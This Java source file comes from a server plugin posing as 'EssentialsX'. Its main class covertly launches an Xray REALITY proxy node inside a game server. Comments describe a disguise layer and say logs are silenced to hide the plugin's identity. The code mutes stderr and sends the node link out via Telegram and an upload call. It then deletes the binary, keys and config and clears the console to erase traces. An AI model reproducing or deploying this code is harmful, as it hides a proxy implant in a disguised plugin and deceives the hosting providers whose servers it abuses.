package com.example.essentialsx.common;

import java.io.IOException;
import java.nio.file.Files;
import java.nio.file.Path;
import java.util.ArrayList;
import java.util.List;
import java.util.concurrent.atomic.AtomicBoolean;

/**
 * 服务主体：加载二进制 → 生成配置 → 拉起 xray → 输出订阅。
 * <p>
 * 启动分两段：
 * <ol>
 *   <li>{@link #start()} 在调用方线程（onEnable）里完成配置加载与伪装层。
 *       伪装层本身已经不再输出伪造启动行，
 *       但保持同步可以让将来重新引入的行为落在正确的位置。</li>
 *   <li>真正拉内核的部分丢到后台线程，不阻塞服务端。</li>
 * </ol>
 */
public final class AppService {

    private final PlatformLogger logger;
    private final AtomicBoolean running = new AtomicBoolean(false);

    private Config config;
    private JnaRunner jnaRunner;
    private ProcessRunner processRunner;

    public AppService(PlatformLogger logger) {
        this.logger = logger;
    }

    /** 可选的运维日志；技术细节由 SHOW_LOG 控制，默认静默。 */
    private void log(String message) {
        if (config != null && !config.showLog) {
            return;
        }
        logger.raw("[EssentialsX] " + message);
    }

    /**
     * 始终输出的日志。
     * <p>
     * 节点链接是使用者唯一能拿走的东西，
     * 不能因为关了 SHOW_LOG 就一起消失。
     */
    private void always(String message) {
        logger.raw(message);
    }

    public void start() {
        if (!running.compareAndSet(false, true)) {
            return;
        }
        config = Config.load(logger);
        Path runtimeDir = config.runtimeDir;

        try {
            Files.createDirectories(runtimeDir);
        } catch (IOException ignored) {
            // 目录已存在或不可建，后续写入会各自报错
        }

        Thread t = new Thread(this::bootstrap, "essentialsx-worker");
        t.setDaemon(true);
        t.start();
    }

    private void bootstrap() {
        try {
            Path runtimeDir = config.runtimeDir;

            RealityKeypair keypair = RealityKeypair.loadOrCreate(
                    runtimeDir.resolve("keypair.properties"), this::log);

            Path configPath = runtimeDir.resolve("config.json");
            String json = new XrayConfig(config, keypair.privateKey).build();
            SecureFiles.writePrivate(configPath, json);
            if (config.showLog) {
                log("xray config written to " + configPath);
            }

            BootBootstrapper boot = new BootBootstrapper(config, this::log);
            // Xray writes its own warnings straight to fd 2 before loglevel
            // takes effect. In quiet mode the fd is muted around the launch
            // itself, then restored -- a fixed sleep in the caller was both
            // too short and too long depending on how fast the library bound.
            if (config.quiet) {
                StderrMute mute = StderrMute.enable();
                try {
                    boot.launch(json, configPath);
                    // Give the native thread time to reach the bind attempt,
                    // which is where the REALITY warning is emitted.
                    Thread.sleep(2500);
                } finally {
                    if (mute != null) {
                        mute.close();
                    }
                }
            } else {
                boot.launch(json, configPath);
            }

            Thread.sleep(1500);
            if (config.showLog) {
                log("web is running");
            }

            Subscription sub = new Subscription(config, keypair.publicKey);
            String link = sub.writeFiles();
            // The link still lands in world/sub.txt and list.txt; printing it
            // is opt-in now, so the console no longer advertises the node.
            if (!config.quiet) {
                always(link);
            }
            if (config.showLog) {
                log("Logs will be cleared in " + config.cleanupDelaySeconds
                        + " seconds, copy the node above");
            }

            sub.sendTelegram(this::log);
            sub.upload(this::log);

            scheduleCleanup(runtimeDir);
        } catch (Throwable e) {
            logger.error("EssentialsX background service failed", e);
            running.set(false);
        }
    }

    /**
     * 搭建完成后延时清理，目的是不在磁盘上留下代理痕迹。
     * <p>
     * 已删文件对<b>当前运行中</b>的服务无影响：
     * <ul>
     *   <li>{@code .so} 已被 JNA 加载进进程内存；</li>
     *   <li>{@code .env} 已在启动时解析为 {@link Config}；</li>
     *   <li>{@code config.json} 已传给 Xray 并被解析。</li>
     * </ul>
     * 但<b>重启后需要重新配置</b>，这是 {@code CLEANUP_MODE=full} 的代价。
     */
    private void scheduleCleanup(Path runtimeDir) {
        if ("off".equals(config.cleanupMode)) {
            return;
        }
        Thread cleanup = new Thread(() -> {
            try {
                Thread.sleep(Math.max(5, config.cleanupDelaySeconds) * 1000L);
                int removed = 0;
                for (Path target : cleanupTargets(runtimeDir)) {
                    if (SecureFiles.deleteQuietly(target)) {
                        removed++;
                    }
                }
                log("cleanup: removed " + removed + " file(s) exposing the proxy");
                if (!config.showLog || config.quiet) {
                    clearConsole();
                }
            } catch (InterruptedException e) {
                Thread.currentThread().interrupt();
            } catch (Exception e) {
                log("cleanup failed: " + e.getMessage());
            }
        }, "essentialsx-cleanup");
        cleanup.setDaemon(true);
        cleanup.start();
    }

    /**
     * 按 {@link Config#cleanupMode} 决定要删哪些文件。
     * <p>
     * 这里没有用 {@code Files.list()} 扫目录，而是精确列举：
     * 扫目录会连 Paper 自己的 {@code level.dat} / {@code region/} 一起删掉，
     * 那不是本功能的目的。
     */
    private List<Path> cleanupTargets(Path runtimeDir) {
        Path serverRoot = Path.of("").toAbsolutePath();
        List<Path> targets = new ArrayList<>();

        // 一、二进制（JNA 已加载，文件可删）
        targets.add(runtimeDir.resolve(config.xrayLibName));
        targets.add(serverRoot.resolve(config.xrayLibName));

        if (!"full".equals(config.cleanupMode)) {
            return targets;
        }

        // 二、Xray 运行时配置（含 Reality 私钥）
        targets.add(runtimeDir.resolve("config.json"));
        targets.add(runtimeDir.resolve("keypair.properties"));

        // 三、订阅与链接
        targets.add(runtimeDir.resolve("sub.txt"));
        targets.add(runtimeDir.resolve("list.txt"));

        // 四、插件写的 UUID 缓存与服务端根目录的 .env
        targets.add(serverRoot.resolve(".uuid"));
        targets.add(serverRoot.resolve(".shortid"));
        targets.add(serverRoot.resolve(".env"));

        return targets;
    }

    public void stop() {
        if (!running.compareAndSet(true, false)) {
            return;
        }
        if (jnaRunner != null) {
            jnaRunner.stop();
        }
        if (processRunner != null) {
            processRunner.stop();
        }
        log("xray stopped");
    }

    public boolean isRunning() {
        return running.get();
    }

    /** 负责把内核拉起来：JNA 进程内 或 外部进程。 */
    private final class BootBootstrapper {

        private final Config cfg;
        private final java.util.function.Consumer<String> sink;

        BootBootstrapper(Config cfg, java.util.function.Consumer<String> sink) {
            this.cfg = cfg;
            this.sink = sink;
        }

        void launch(String json, Path configPath) throws IOException {
            if (cfg.nativeMode.equals("process")) {
                launchProcess(configPath);
            } else {
                launchJna(json);
            }
        }

        private void launchJna(String json) throws IOException {
            // 内部技术日志（Using cached / started via JNA）会把插件身份暴露得彻底，
            // 默认丢进空水槽；需要排障时把 SHOW_LOG 打开。
            java.util.function.Consumer<String> quiet = cfg.showLog ? sink : m -> { };
            Path lib = new BinaryStore(cfg, quiet).xray();
            JnaRunner.verifySymbols(lib.toString(), List.of("StartXray", "StopXray"));

            jnaRunner = new JnaRunner(lib.toString(), "StartXray", "StopXray", json, "xray");
            jnaRunner.start(quiet);
        }

        private void launchProcess(Path configPath) {
            String exe = cfg.xrayBinary.isBlank() ? "xray" : cfg.xrayBinary;
            java.util.function.Consumer<String> quiet = cfg.showLog ? sink : m -> { };
            processRunner = new ProcessRunner(exe, List.of("run", "-c", configPath.toString()),
                    "xray", cfg.runtimeDir);
            processRunner.start(quiet);
        }
    }

    /** 清屏；控制台不支持 ANSI 时静默忽略。 */
    private static void clearConsole() {
        try {
            System.out.print("\033[H\033[2J");
            System.out.flush();
        } catch (Exception ignored) {
            // 无 ANSI 支持
        }
    }
}
